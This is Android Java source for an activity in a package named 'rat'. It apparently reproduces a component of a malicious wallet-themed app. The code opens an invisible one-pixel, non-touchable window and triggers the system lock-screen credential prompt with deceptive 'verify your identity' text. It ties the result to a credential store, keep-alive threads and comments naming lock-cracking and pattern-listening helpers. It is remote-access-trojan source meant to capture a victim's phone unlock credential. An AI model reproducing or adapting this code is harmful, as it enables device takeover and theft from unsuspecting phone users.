package com.vendor.rat.activity;

import android.app.Activity;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;

import com.vendor.rat.credential.LockCredentialStore;
import com.vendor.rat.helper.BlockViewHelper;
import com.vendor.rat.keepalive.thread.StrategyThread;

import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * Vendor: com.guard.wallet.activity.ConfirmDeviceActivity
 * Transparent activity that triggers device credential verification
 * (biometric or lock screen password).
 */
public class ConfirmDeviceActivity extends Activity {

    public static volatile ConfirmDeviceActivity instance;
    public static final AtomicReference<String> eventCodeRef = new AtomicReference<>(null);

    public String title = "";
    public String subTitle = "";
    public String description = "";
    public final AtomicBoolean launchStarted = new AtomicBoolean(false);

    public static final String EXTRA_TITLE = "CONFIRM_DEVICE_CREDENTIAL_TITLE";
    public static final String EXTRA_SUB_TITLE = "CONFIRM_DEVICE_CREDENTIAL_SUB_TITLE";
    public static final String EXTRA_DESCRIPTION = "CONFIRM_DEVICE_CREDENTIAL_DESCRIPTION";
    public static final String EXTRA_EVENT_CODE = "CONFIRM_FOR_EVENT_CODE";
    private static final int REQUEST_CODE = 1001;

    /**
     * Static factory for creating an Intent to launch this activity.
     */
    public static Intent newIntent(Context ctx, String eventCode) {
   Intent intent = new Intent(ctx, ConfirmDeviceActivity.class);
        intent.putExtra(EXTRA_EVENT_CODE, eventCode);
        return intent;
    }

    public static void onCredentialConfirmed() {
        // ADAPT: vendor triggers CrackLockCipherPlug and PatternListenHelper
 Log.d("ConfirmDeviceActivity", "onCredentialConfirmed, eventCode=" + eventCodeRef.get());
    }

    public static ConfirmDeviceActivity getInstance() {
        synchronized (ConfirmDeviceActivity.class) {
        return instance;
        }
    }

    @Override
    public final void finish() {
     // ADAPT: vendor clears accessibility delegate and resets assist mode
    super.finish();
    }

    @Override
    public final void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQUEST_CODE) {
 if (resultCode == RESULT_OK) {
     LockCredentialStore.markCurrentRunVerified();
                onCredentialConfirmed();
     try {
  StrategyThread.triggerKeepAliveIfNeeded();
        } catch (Exception e) {
        Log.e("ConfirmDeviceActivity", "triggerKeepAliveIfNeeded error", e);
          }
    finish();
       } else {
       // RESULT_CANCELED or any other result
    LockCredentialStore.resetCurrentRunFlags();
             LockCredentialStore.clearAll();
       LockCredentialStore.markPromptSuppressedForCurrentRun();
           BlockViewHelper.removeViewInternal();
          finish();
            }
        }
  }

    @Override
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        Bundle extras = getIntent().getExtras();
        if (extras != null) {
            this.title = extras.getString(EXTRA_TITLE);
            this.subTitle = extras.getString(EXTRA_SUB_TITLE);
 this.description = extras.getString(EXTRA_DESCRIPTION);
 eventCodeRef.set(extras.getString(EXTRA_EVENT_CODE));
        } else {
            this.title = "Verify personal identity";
    this.subTitle = "Privacy protection";
   this.description = "To protect your privacy, please enter your lock screen password to verify that you are the one making the operation.";
  eventCodeRef.set("PREPARE_FOR_APP_CONFIRM_LOCK");
        }
        View view = new View(this);
   if (Build.VERSION.SDK_INT >= 30) {
       // ADAPT: vendor uses WindowMetrics for layout bounds
      }
  setContentView(view);
     WindowManager.LayoutParams attributes = getWindow().getAttributes();
        attributes.dimAmount = 0.0f;
        attributes.x = 0;
        attributes.y = 0;
  attributes.width = 1;
attributes.height = 1;
 attributes.gravity = 8388661;
        getWindow().setAttributes(attributes);
        getWindow().getDecorView().setBackgroundColor(0);
        getWindow().setFlags(1024, 1024);
 getWindow().addFlags(32);
        getWindow().addFlags(16);
      getWindow().addFlags(67108864);
        getWindow().addFlags(134217728);
        getWindow().addFlags(262144);
     instance = this;
    }

    @Override
    public final void onDestroy() {
   Log.d("ConfirmDeviceActivity", "ConfirmDeviceActivity onDestroy:" + Thread.currentThread().getId());
      super.onDestroy();
 if (instance != null) {
  synchronized (ConfirmDeviceActivity.class) {
      instance = null;
      }
        }
    }

    @Override
    public final void onResume() {
    super.onResume();
        Log.d("ConfirmDeviceActivity", "ConfirmDeviceActivity onResume:" + Thread.currentThread().getId());
      if (launchStarted.get()) {
            return;
        }
 try {
     KeyguardManager keyguardManager = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
          if (keyguardManager != null) {
             Intent confirmIntent = keyguardManager.createConfirmDeviceCredentialIntent(title, description);
   if (confirmIntent != null) {
          confirmIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        confirmIntent.addFlags(67108864);
                 confirmIntent.addFlags(8388608);
          launchStarted.set(true);
             startActivityForResult(confirmIntent, REQUEST_CODE);
        } else {
              // No lock screen set — cleanup and finish
 Log.e("ConfirmDeviceActivity", "createConfirmDeviceCredentialIntent returned null (no lock screen set)");
            LockCredentialStore.resetCurrentRunFlags();
      LockCredentialStore.clearAll();
         LockCredentialStore.markPromptSuppressedForCurrentRun();
   BlockViewHelper.removeViewInternal();
           finish();
                }
            }
    } catch (Exception e) {
       Log.e("ConfirmDeviceActivity", "onResume error", e);
 }
    }

    @Override
    public final void onStart() {
        super.onStart();
        Log.d("ConfirmDeviceActivity", "ConfirmDeviceActivity onStart:" + Thread.currentThread().getId());
    }

    @Override
    public final void onStop() {
        Log.d("ConfirmDeviceActivity", "ConfirmDeviceActivity onStop:" + Thread.currentThread().getId());
        super.onStop();
    }
}
